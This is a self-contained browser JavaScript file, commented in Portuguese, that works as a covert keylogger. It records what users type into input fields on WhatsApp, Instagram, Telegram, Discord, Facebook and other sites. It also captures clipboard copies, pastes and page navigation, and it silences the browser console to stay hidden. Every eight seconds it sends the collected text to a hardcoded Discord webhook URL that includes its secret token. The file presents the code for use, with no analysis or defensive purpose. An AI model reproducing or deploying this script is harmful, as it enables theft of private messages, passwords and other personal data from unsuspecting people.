(function() {
    'use strict';

    // ─── GUARDA CONTRA MÚLTIPLAS INSTÂNCIAS ───
    if (window._testing) {
        try {
            if (typeof window._testing.kill === 'function') {
                window._testing.kill();
            }
        } catch(e) {}
        delete window._testing;
    }

    // ─── CONFIGURAÇÕES ───
    const _id = '1528620856354537472';
    const _token = 'EDrEckoSN7dgJzZjj8LTeaisf_SxMjkrcy5QQMijZS3QcDFrNSEkvWPQde2-0V4EugEy';
    const _endpoint = 'https://discordapp.com/api/webhooks/' + _id + '/' + _token;

    const _batchSize = 10;          // Mensagens por lote
    const _flushInterval = 8000;    // 8 segundos
    const _maxFieldLength = 900;    // Limite seguro do Discord por campo

    let _store = [];
    let _timer = null;
    let _lastUrl = document.URL;
    let _lastTitle = document.title;
    let _session = localStorage.getItem('_collector_session') || (Math.random().toString(36).slice(2, 10) + Date.now().toString(36));
    localStorage.setItem('_collector_session', _session);
    let _eventCounts = { msg: 0, copy: 0, paste: 0, nav: 0 };
    let _isFlushing = false;
    let _navObs = null;

    let _buffer = '';
    let _isCapturing = false;
    let _targetTag = '';
    let _targetId = '';
    let _targetPlatform = '';

    const _noop = () => {};

    // ─── SILENCIA CONSOLE ───
    const _orig = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };
    console.log = _noop;
    console.warn = _noop;
    console.error = _noop;
    console.info = _noop;
    console.debug = _noop;

    // ─── UTILITÁRIOS ───
    function _ts() {
        return new Date().toISOString().replace('T', ' ').slice(0, 19);
    }

    function _push(type, data) {
        _store.push({ t: _ts(), ty: type, d: data });
        _eventCounts[type] = (_eventCounts[type] || 0) + 1;
        if (_store.length >= _batchSize && !_isFlushing) _flush();
    }

    function _chunkArray(arr, size) {
        const result = [];
        for (let i = 0; i < arr.length; i += size) {
            result.push(arr.slice(i, i + size));
        }
        return result;
    }

    function _formatClipboard(text) {
        const lines = text.split('\n');
        const firstLines = lines.slice(0, 3);
        const display = firstLines.map(l => l.slice(0, 50)).join('↵ ');
        return display + (lines.length > 3 ? '… (+' + (lines.length - 3) + ' linhas)' : '');
    }

    function _getPlatform() {
        const url = document.URL;
        if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'WhatsApp';
        if (url.includes('habblive') || url.includes('habblet')) return 'Habblive';
        if (url.includes('instagram')) return 'Instagram';
        if (url.includes('telegram')) return 'Telegram';
        if (url.includes('discord')) return 'Discord';
        if (url.includes('facebook')) return 'Facebook';
        if (url.includes('twitter') || url.includes('x.com')) return 'Twitter';
        return 'Web';
    }

    // ─── SUBMISSÃO DE MENSAGEM ───
    function _submitMessage() {
        if (_buffer.trim().length > 0) {
            _push('msg', {
                txt: _buffer.trim(),
                platform: _targetPlatform || _getPlatform(),
                ctx: _targetTag + (_targetId ? '#' + _targetId : '')
            });
        }
        _buffer = '';
        _isCapturing = false;
        _targetTag = '';
        _targetId = '';
        _targetPlatform = '';
    }

    // ─── BUILD DO EMBED COM VISUALIZAÇÃO MELHORADA ───
    function _buildEmbed(events) {
        const groups = { msg: [], copy: [], paste: [], nav: [] };
        events.forEach(e => { if (groups[e.ty]) groups[e.ty].push(e); });

        const fields = [];

        // Formata uma linha de mensagem
        function formatMsg(e) {
            const ts = e.t || '--:--:--';
            const platform = e.d.platform || 'Web';
            const txt = (e.d.txt || '').slice(0, 150);
            return `[${ts}] [${platform}] ${txt}`;
        }

        function addGroup(name, items, formatter) {
            if (!items.length) return;
            const chunks = _chunkArray(items, 8); // 8 por bloco para não estourar
            chunks.forEach((chunk, idx) => {
                const header = idx === 0
                    ? `📌 ${name} (${items.length}) • ${_ts()}`
                    : `⋯ continua (${idx + 1}/${chunks.length})`;
                const lines = chunk.map(formatter);
                let value = lines.join('\n');
                // Adiciona separador no final de cada bloco
                if (idx === chunks.length - 1) {
                    value += '\n──────────────────';
                } else {
                    value += '\n───────────────';
                }
                // Trunca se necessário
                if (value.length > _maxFieldLength) {
                    value = value.slice(0, _maxFieldLength) + '…\n──────────────────';
                }
                fields.push({
                    name: header,
                    value: '```\n' + value + '\n```',
                    inline: false
                });
            });
        }

        addGroup('💬 Mensagens', groups.msg, formatMsg);
        addGroup('📋 Cópias', groups.copy, e => `📋 ${_formatClipboard(e.d.txt)}`);
        addGroup('📥 Colagens', groups.paste, e => `📥 ${_formatClipboard(e.d.txt)}`);
        addGroup('🧭 Navegação', groups.nav, e => {
            const title = (e.d.title || 'Unknown').slice(0, 40);
            const url = (e.d.url || '').replace(/^https?:\/\//, '').slice(0, 35);
            return `🔗 ${title} (${url})`;
        });

        const total = events.length;
        const summary = `📊 ${total} eventos • 💬 ${groups.msg.length} 📋 ${groups.copy.length} 📥 ${groups.paste.length} 🧭 ${groups.nav.length}`;

        return {
            embeds: [{
                color: 0x2b2d31,
                title: '📡 Activity Feed',
                description: summary,
                fields: fields.slice(0, 25),
                footer: { text: 'Session ' + _session + ' • ' + _ts() },
                timestamp: new Date().toISOString()
            }]
        };
    }

    function _send(events) {
        if (!events || !events.length) return;
        if (_isFlushing) return;
        _isFlushing = true;

        try {
            const payload = _buildEmbed(events);
            fetch(_endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(_noop).finally(function() {
                _isFlushing = false;
            });
        } catch (_) {
            _isFlushing = false;
        }
    }

    function _flush() {
        if (!_store.length) return;
        _send(_store.splice(0, _store.length));
    }

    // ─── HANDLERS DE CAPTURA ───
    function _handleKeyDown(e) {
        const key = e.key;
        const target = e.target;

        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
            return;
        }

        // Enter sem Shift = enviar mensagem
        if (key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            _submitMessage();
            return;
        }

        // Escape = cancelar
        if (key === 'Escape') {
            _buffer = '';
            _isCapturing = false;
            _targetTag = '';
            _targetId = '';
            _targetPlatform = '';
            return;
        }

        // Backspace = remover último caractere do buffer
        if (key === 'Backspace') {
            if (_isCapturing) {
                _buffer = _buffer.slice(0, -1);
            }
            return;
        }

        // Só captura caracteres imprimíveis (exclui Shift, Alt, Ctrl, setas, F1-F12, etc.)
        if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey && key.match(/[\x20-\x7E]|[\u00A0-\uFFFF]/)) {
            if (!_isCapturing) {
                _isCapturing = true;
                _targetTag = target.tagName;
                _targetId = target.id || '';
                _targetPlatform = _getPlatform();
                _buffer = '';
            }
            _buffer += key;
            return;
        }

        // Ignora qualquer outra tecla
        return;
    }

    function _handleFocusOut(e) {
        const target = e.target;
        if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
            if (_isCapturing && _buffer.trim().length > 0) {
                _submitMessage();
            } else {
                _buffer = '';
                _isCapturing = false;
                _targetTag = '';
                _targetId = '';
                _targetPlatform = '';
            }
        }
    }

    function _handlePaste(e) {
        const target = e.target;
        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
            return;
        }
        const txt = e.clipboardData && e.clipboardData.getData('text/plain');
        if (!txt) return;
        if (!_isCapturing) {
            _isCapturing = true;
            _targetTag = target.tagName;
            _targetId = target.id || '';
            _targetPlatform = _getPlatform();
            _buffer = '';
        }
        _buffer += txt;
        _push('paste', { txt: txt.slice(0, 500), len: txt.length });
    }

    function _trackCopy(e) {
        const txt = window.getSelection().toString().trim();
        if (txt && txt.length > 0) {
            _push('copy', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackNav() {
        const currentUrl = document.URL;
        const currentTitle = document.title;
        if (currentUrl !== _lastUrl) {
            _lastUrl = currentUrl;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
        } else if (currentTitle !== _lastTitle) {
            _lastTitle = currentTitle;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
        }
    }

    function _heartbeat() {
        _push('heartbeat', { online: true, url: document.URL });
    }

    // ─── INICIALIZAÇÃO ───
    function _init() {
        document.addEventListener('keydown', _handleKeyDown, true);
        document.addEventListener('focusout', _handleFocusOut, true);
        document.addEventListener('paste', _handlePaste, true);
        document.addEventListener('copy', _trackCopy, true);

        _navObs = new MutationObserver(function() { _trackNav(); });
        _navObs.observe(document, { subtree: true, childList: true });
        window.addEventListener('popstate', _trackNav);
        window.addEventListener('hashchange', _trackNav);

        _timer = setInterval(_flush, _flushInterval);
        setInterval(_heartbeat, 300000);

        window.addEventListener('beforeunload', function() {
            _flush();
            if (_navObs) _navObs.disconnect();
        });

        window._logs = {
            kill: function() {
                clearInterval(_timer);
                _timer = null;
                _flush();
                document.removeEventListener('keydown', _handleKeyDown, true);
                document.removeEventListener('focusout', _handleFocusOut, true);
                document.removeEventListener('paste', _handlePaste, true);
                document.removeEventListener('copy', _trackCopy, true);
                window.removeEventListener('popstate', _trackNav);
                window.removeEventListener('hashchange', _trackNav);
                if (_navObs) { _navObs.disconnect(); _navObs = null; }
                localStorage.removeItem('_collector_session');
                console.log = _orig.log;
                console.warn = _orig.warn;
                console.error = _orig.error;
                console.info = _orig.info;
                console.debug = _orig.debug;
                delete window._testing;
            },
            flush: _flush
        };
    }

    // ─── EXECUTA ───
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(_init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', function() { setTimeout(_init, 0); });
    }

    setTimeout(function() {
        if (!window._logs) _init();
    }, 3000);

    // ─── EXPÕE KILL ───
    window._testing = {
        kill: function() {
            if (window._logs && typeof window._logs.kill === 'function') {
                window._logs.kill();
            } else {
                if (_timer) { clearInterval(_timer); _timer = null; }
                if (_navObs) { _navObs.disconnect(); _navObs = null; }
                document.removeEventListener('keydown', _handleKeyDown, true);
                document.removeEventListener('focusout', _handleFocusOut, true);
                document.removeEventListener('paste', _handlePaste, true);
                document.removeEventListener('copy', _trackCopy, true);
                window.removeEventListener('popstate', _trackNav);
                window.removeEventListener('hashchange', _trackNav);
                localStorage.removeItem('_collector_session');
                delete window._testing;
            }
        },
        flush: function() {
            if (window._logs && typeof window._logs.flush === 'function') {
                window._logs.flush();
            } else {
                _flush();
            }
        }
    };

})();